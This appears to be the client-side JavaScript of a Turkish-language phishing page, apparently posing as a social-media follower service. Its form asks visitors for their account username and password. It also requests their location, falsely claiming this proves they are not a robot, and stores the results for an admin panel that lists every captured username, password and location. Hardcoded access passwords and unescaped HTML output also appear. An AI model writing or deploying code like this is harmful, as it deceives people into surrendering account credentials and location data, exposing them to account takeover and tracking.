function login() {
    const password = document.getElementById('login-password').value;
    if (password === 'hile00') {
        document.getElementById('login-container').classList.add('hidden');
        document.getElementById('menu-container').classList.remove('hidden');
    } else {
        document.getElementById('login-error').textContent = 'Hatalı şifre!';
    }
}

function showForm() {
    document.getElementById('menu-container').classList.add('hidden');
    document.getElementById('form-container').classList.remove('hidden');
}

function showAdminLogin() {
    document.getElementById('menu-container').classList.add('hidden');
    document.getElementById('admin-login-container').classList.remove('hidden');
}

function submitForm() {
    alert("Lütfen robot olmadığınızı anlamak için konum izni verin.");
    navigator.geolocation.getCurrentPosition((position) => {
        const username = document.getElementById('username').value;
        const userpass = document.getElementById('userpass').value;
        const count = document.querySelector('input[name="count"]:checked')?.value || 'Seçilmedi';
        const location = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
        const entry = { username, userpass, count, location };
        let data = JSON.parse(localStorage.getItem('entries') || '[]');
        data.push(entry);
        localStorage.setItem('entries', JSON.stringify(data));
        alert('Robot olmadığınız anlaşıldı lütfen bekleyiniz...');
    }, () => {
        alert("Lütfen bağlantıyı chorem'da açın.");
    });
}

function adminLogin() {
    const password = document.getElementById('admin-password').value;
    if (password === 'eren25w') {
        document.getElementById('admin-login-container').classList.add('hidden');
        document.getElementById('admin-panel').classList.remove('hidden');
        displayData();
    } else {
        document.getElementById('admin-login-error').textContent = 'Hatalı şifre!';
    }
}

function displayData() {
    const data = JSON.parse(localStorage.getItem('entries') || '[]');
    const adminData = document.getElementById('admin-data');
    adminData.innerHTML = '';
    data.forEach(entry => {
        const div = document.createElement('div');
        div.innerHTML = `<p><strong>Kullanıcı:</strong> ${entry.username} | <strong>Şifre:</strong> ${entry.userpass} | <strong>Takipçi:</strong> ${entry.count} | <strong>Konum:</strong> ${entry.location}</p>`;
        adminData.appendChild(div);
    });
}
